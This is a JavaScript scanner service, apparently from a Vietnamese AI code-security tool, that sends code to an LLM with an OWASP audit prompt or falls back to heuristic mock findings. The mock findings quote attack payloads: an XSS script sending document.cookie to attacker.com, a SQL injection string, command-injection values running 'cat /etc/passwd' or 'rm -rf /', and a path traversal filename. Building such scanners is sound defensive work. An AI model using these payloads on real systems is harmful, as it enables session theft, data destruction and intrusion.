import { OpenAI, AzureOpenAI } from 'openai';

export class ScannerService {
  constructor() {
    // Hỗ trợ cả Groq API Key (gsk_...) và OpenAI API Key (sk-...)
    this.groqKey = process.env.GROQ_API_KEY || (process.env.OPENAI_API_KEY?.startsWith('gsk_') ? process.env.OPENAI_API_KEY : '');
    this.openaiKey = process.env.OPENAI_API_KEY && !process.env.OPENAI_API_KEY.startsWith('gsk_') ? process.env.OPENAI_API_KEY : '';

    this.isGroq = Boolean(this.groqKey);
    this.isAzure = Boolean(process.env.AZURE_API_VERSION && process.env.AZURE_DEPLOYMENT);
    this.isGithubModels = process.env.USE_GITHUB_MODELS === 'true';

    if (this.isGroq) {
      this.apiKey = this.groqKey;
      this.model = process.env.MODEL || 'openai/gpt-oss-120b';
      this.provider = 'Groq Cloud AI (GPT-OSS 120B)';
      this.client = new OpenAI({
        apiKey: this.groqKey,
        baseURL: 'https://api.groq.com/openai/v1',
      });
    } else if (this.openaiKey) {
      this.apiKey = this.openaiKey;
      this.model = process.env.MODEL || (this.isGithubModels ? 'openai/gpt-4o-mini' : 'gpt-4o-mini');
      this.provider = this.isAzure ? 'Azure OpenAI' : (this.isGithubModels ? 'GitHub Models' : 'OpenAI');

      if (this.isAzure) {
        this.client = new AzureOpenAI({
          apiKey: this.openaiKey,
          endpoint: process.env.OPENAI_API_ENDPOINT || '',
          apiVersion: process.env.AZURE_API_VERSION || '',
          deployment: process.env.AZURE_DEPLOYMENT || '',
        });
      } else {
        this.client = new OpenAI({
          apiKey: this.openaiKey,
          baseURL: this.isGithubModels
            ? 'https://models.github.ai/inference'
            : (process.env.OPENAI_API_ENDPOINT || 'https://api.openai.com/v1'),
        });
      }
    } else {
      this.apiKey = '';
      this.model = 'gpt-4o-mini';
      this.provider = 'OpenAI';
    }
  }

  hasApiKey() {
    return Boolean(this.apiKey && this.apiKey.trim().length > 0);
  }

  generateSecurityPrompt(code, language = 'auto') {
    return `Bạn là một chuyên gia An toàn thông tin và Đánh giá mã nguồn (AppSec Expert & Code Auditor) với chuyên môn sâu về OWASP Top 10.
Nhiệm vụ của bạn là phân tích đoạn mã nguồn dưới đây (ngôn ngữ: ${language}) và rà soát mọi lỗ hổng bảo mật tiềm ẩn.

DANH MỤC LỖ HỔNG CẦN CHÚ Ý ĐẶC BIỆT (OWASP Top 10):
1. SQL Injection / NoSQL Injection
2. Cross-Site Scripting (XSS)
3. Hardcoded Secrets (API Key, Mật khẩu, JWT Token, Private Key)
4. Insecure Direct Object Reference (IDOR)
5. Cross-Site Request Forgery (CSRF)
6. Insecure Deserialization
7. Path / Directory Traversal
8. OS Command Injection
9. Sensitive Data Exposure / PII Leaks qua log/console
10. Broken Authentication & Session Management (Lưu mật khẩu plain text, thuật toán hash lỗi thời)
11. Cryptographic Failures / Insecure Encryption (MD5, DES, ECB mode...)

QUY TẮC QUAN TRỌNG VỀ SỐ DÒNG:
Trong đoạn code dưới đây, mỗi dòng đều có đánh dấu số dòng [L{số dòng}]. Bạn BẮT BUỘC phải chỉ ra chính xác số dòng (trường line_number kiểu số nguyên) để giao diện bôi đỏ dòng code đó cho người dùng.

YÊU CẦU ĐỊNH DẠNG TRẢ VỀ (JSON duy nhất):
{
  "is_safe": boolean,
  "overall_summary": "Tóm tắt ngắn gọn tình trạng bảo mật (Tiếng Việt)",
  "vulnerabilities": [
    {
      "type": "Tên loại lỗ hổng",
      "severity": "Cao" | "Trung bình" | "Thấp" | "Nghiêm trọng",
      "owasp_category": "Mã OWASP tương ứng",
      "line_number": 15, // BẮT BUỘC: Số nguyên chỉ chính xác dòng code bị lỗi theo chỉ số [L...]
      "affected_lines": "Trích nguyên văn dòng code gặp vấn đề tại dòng đó",
      "explanation": "Giải thích chi tiết tại sao đoạn code này lại nguy hiểm",
      "attack_scenario": "Kịch bản mẫu kẻ tấn công có thể khai thác cụ thể (payload ví dụ)",
      "remediation": "Hướng dẫn cách khắc phục triệt để",
      "fixed_code": "Đoạn code đã được sửa an toàn hoàn chỉnh"
    }
  ],
  "recommendations": [
    "Khuyến nghị bảo mật bổ sung 1"
  ]
}

Nếu code an toàn, đặt "is_safe": true, "vulnerabilities": [].

Đoạn code cần phân tích (kèm chỉ số dòng):
\`\`\`${language}
${code.split('\n').map((l, i) => `[L${i + 1}] ${l}`).join('\n')}
\`\`\`
`;
  }

  async scanCode(code, language = 'auto') {
    if (!code || !code.trim()) {
      throw new Error("Mã nguồn không được để trống.");
    }

    // Nếu có API key thật cấu hình
    if (this.hasApiKey() && this.client) {
      const prompt = this.generateSecurityPrompt(code, language);
      const res = await this.client.chat.completions.create({
        model: this.model,
        messages: [{ role: 'user', content: prompt }],
        temperature: 0.2,
        response_format: { type: "json_object" }
      });

      const raw = res.choices[0]?.message?.content || '{}';
      try {
        const parsed = JSON.parse(raw);
        return {
          ...parsed,
          source: 'ai_live',
          model_used: this.model
        };
      } catch (e) {
        throw new Error("Không thể parse kết quả JSON từ AI: " + raw);
      }
    }

    // Fallback: Mô phỏng phân tích bảo mật thông minh dựa trên heuristic (Mock Analyzer khi chưa có OPENAI_API_KEY)
    return this.mockAnalysis(code, language);
  }

  mockAnalysis(code, language) {
    const codeLower = code.toLowerCase();
    const vulnerabilities = [];

    // SQLi check
    if (codeLower.includes('select ') && (code.includes('f"') || code.includes("f'") || code.includes(' + ') || code.includes('${') || code.includes('?'))) {
      if (!code.includes('?')) {
        const lines = code.split('\n');
        const lineIdx = lines.findIndex(l => l.toLowerCase().includes('select') && (l.includes('+') || l.includes('$') || l.includes('f"') || l.includes("f'")));
        const lineContent = lineIdx >= 0 ? lines[lineIdx].trim() : "query = f\"SELECT id, username, email FROM users WHERE username = '{username}'\"";
        vulnerabilities.push({
          type: "SQL Injection",
          severity: "Cao",
          owasp_category: "A03:2021-Injection",
          line_number: lineIdx >= 0 ? (lineIdx + 1) : 11,
          affected_lines: lineContent,
          explanation: "Truy vấn SQL được ghép nối trực tiếp với biến đầu vào của người dùng mà không sử dụng cơ chế tham số hóa (Parameterized Query/Prepared Statement).",
          attack_scenario: "Kẻ tấn công có thể nhập username: ' OR '1'='1' -- để bỏ qua cơ chế xác thực hoặc trích xuất toàn bộ dữ liệu người dùng.",
          remediation: "Sử dụng Parameterized Queries hoặc Prepared Statements do database driver cung cấp (ví dụ '?' trong SQLite hoặc '%s' trong psycopg2).",
          fixed_code: `# Code khắc phục an toàn:\nquery = "SELECT id, username, email FROM users WHERE username = ?"\ncursor.execute(query, (username,))`
        });
      }
    }

    // XSS check
    if (codeLower.includes('innerhtml') || (codeLower.includes('res.send(') && code.includes('${') && codeLower.includes('<div>'))) {
      const lines = code.split('\n');
      const lineIdx = lines.findIndex(l => l.includes('innerHTML') || (l.includes('${') && (l.includes('userBio') || l.includes('bio'))));
      const lineContent = lineIdx >= 0 ? lines[lineIdx].trim() : "<div id=\"user-bio\">${userBio}</div>";
      vulnerabilities.push({
        type: "Cross-Site Scripting (Reflected/DOM XSS)",
        severity: "Cao",
        owasp_category: "A03:2021-Injection",
        line_number: lineIdx >= 0 ? (lineIdx + 1) : 10,
        affected_lines: lineContent,
        explanation: "Dữ liệu người dùng được chèn trực tiếp vào cấu trúc HTML của trang mà không qua bộ lọc mã hóa (HTML Entity Encoding/Sanitization).",
        attack_scenario: "Kẻ tấn công gửi chuỗi <script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script> để đánh cắp phiên đăng nhập.",
        remediation: "Sử dụng DOMPurify để sanitize hoặc dùng textContent thay vì innerHTML. Trong template engine, luôn bật tính năng auto-escaping.",
        fixed_code: `// Sử dụng textContent hoặc escape HTML\nconst safeBio = DOMPurify.sanitize(userBio);`
      });
    }

    // Hardcoded Secret check
    if (code.includes('MOCK_SECRET_KEY') || (codeLower.includes('secret') && (code.includes('"') || code.includes("'"))) || codeLower.includes('supersecretdbpassword')) {
      const lines = code.split('\n');
      const lineIdx = lines.findIndex(l => l.includes('MOCK_SECRET_KEY') || l.toLowerCase().includes('secret') || l.toLowerCase().includes('password'));
      const lineContent = lineIdx >= 0 ? lines[lineIdx].trim() : 'const STRIPE_SECRET_KEY = "MOCK_SECRET_KEY_EX_1234567890_NEVER_HARDCODE";';
      vulnerabilities.push({
        type: "Hardcoded Secrets & Sensitive Credentials",
        severity: "Nghiêm trọng",
        owasp_category: "A07:2021-Identification & Auth Failures",
        line_number: lineIdx >= 0 ? (lineIdx + 1) : 7,
        affected_lines: lineContent,
        explanation: "Các khóa bí mật, API key của dịch vụ thanh toán hoặc mật khẩu cơ sở dữ liệu bị ghi cứng trực tiếp vào mã nguồn.",
        attack_scenario: "Khi mã nguồn được đẩy lên kho lưu trữ công khai (GitHub) hoặc bị rò rỉ, kẻ tấn công có thể quét tự động và chiếm quyền truy cập tài khoản thanh toán hoặc CSDL.",
        remediation: "Lưu trữ thông tin nhạy cảm trong Biến môi trường (.env, Vault, AWS Secrets Manager) và đưa file cấu hình vào .gitignore.",
        fixed_code: `// Đọc từ biến môi trường:\nconst STRIPE_SECRET_KEY = process.env.STRIPE_SECRET_KEY;\nconst DB_PASSWORD = process.env.DB_PASSWORD;`
      });
    }

    // Command Injection check
    if (codeLower.includes('exec(') || codeLower.includes('system(') || codeLower.includes('spawn(')) {
      if (code.includes('${') || code.includes('+') || code.includes('%')) {
        const lines = code.split('\n');
        const lineIdx = lines.findIndex(l => l.includes('exec(') || l.includes('system('));
        const lineContent = lineIdx >= 0 ? lines[lineIdx].trim() : 'exec(`ping -c 4 ${targetHost}`, ...)';
        vulnerabilities.push({
          type: "OS Command Injection",
          severity: "Nghiêm trọng",
          owasp_category: "A03:2021-Injection",
          line_number: lineIdx >= 0 ? (lineIdx + 1) : 8,
          affected_lines: lineContent,
          explanation: "Tham số đầu vào từ người dùng được đưa trực tiếp vào chuỗi lệnh shell hệ điều hành.",
          attack_scenario: "Kẻ tấn công truyền tham số: 127.0.0.1; cat /etc/passwd hoặc rm -rf / để thực thi lệnh tùy ý trên máy chủ.",
          remediation: "Tránh thực thi lệnh shell trực tiếp. Nếu bắt buộc, sử dụng API truyền tham số dạng mảng (execFile) và kiểm tra whitelist ký tự.",
          fixed_code: `// Sử dụng execFile với mảng tham số cố định:\nconst { execFile } = require('child_process');\nexecFile('ping', ['-c', '4', sanitizeHost(targetHost)], (err, stdout) => { ... });`
        });
      }
    }

    // Path Traversal check
    if (codeLower.includes('send_file') || (codeLower.includes('path') && code.includes('..')) || code.includes('os.path.join')) {
      const lines = code.split('\n');
      const lineIdx = lines.findIndex(l => l.includes('os.path.join') || l.includes('send_file'));
      const lineContent = lineIdx >= 0 ? lines[lineIdx].trim() : 'file_path = os.path.join(STORAGE_DIR, filename)';
      vulnerabilities.push({
        type: "Path Traversal / Arbitrary File Read",
        severity: "Cao",
        owasp_category: "A01:2021-Broken Access Control",
        line_number: lineIdx >= 0 ? (lineIdx + 1) : 11,
        affected_lines: lineContent,
        explanation: "Đường dẫn file được xây dựng bằng cách nối trực tiếp chuỗi filename từ người dùng mà không chuẩn hóa và kiểm tra thư mục cha.",
        attack_scenario: "Kẻ tấn công gửi filename='../../../../windows/win.ini' để đọc các tập tin nhạy cảm của hệ điều hành.",
        remediation: "Sử dụng os.path.abspath và kiểm tra path.startswith(ALLOWED_DIRECTORY), hoặc lấy basename của file.",
        fixed_code: `safe_filename = os.path.basename(filename)\nfile_path = os.path.join(STORAGE_DIR, safe_filename)`
      });
    }

    const isSafe = vulnerabilities.length === 0;

    return {
      is_safe: isSafe,
      overall_summary: isSafe
        ? "Đoạn mã tuân thủ tốt các nguyên tắc an toàn cơ bản (không phát hiện dấu hiệu lỗ hổng OWASP Top 10 phổ biến)."
        : `Phát hiện ${vulnerabilities.length} lỗ hổng bảo mật nghiêm trọng trong đoạn mã cần được khắc phục ngay lập tức.`,
      vulnerabilities: vulnerabilities,
      recommendations: isSafe
        ? [
            "Tiếp tục duy trì nguyên tắc tham số hóa truy vấn và kiểm tra chặt chẽ input đầu vào.",
            "Tích hợp AI Security Bot vào GitHub Pull Request để rà soát tự động mọi thay đổi code tiếp theo."
          ]
        : [
            "Khắc phục ngay các lỗ hổng mức độ Cao/Nghiêm trọng trước khi đưa vào môi trường Production.",
            "Áp dụng nguyên tắc phòng thủ theo chiều sâu (Defense-in-depth) và xác thực input ở mọi tầng."
          ],
      source: 'heuristic_engine',
      notice: 'Chưa cấu hình OPENAI_API_KEY trong file .env. Hệ thống đang sử dụng Bộ phân tích Heuristic Engine mô phỏng sẵn.'
    };
  }
}
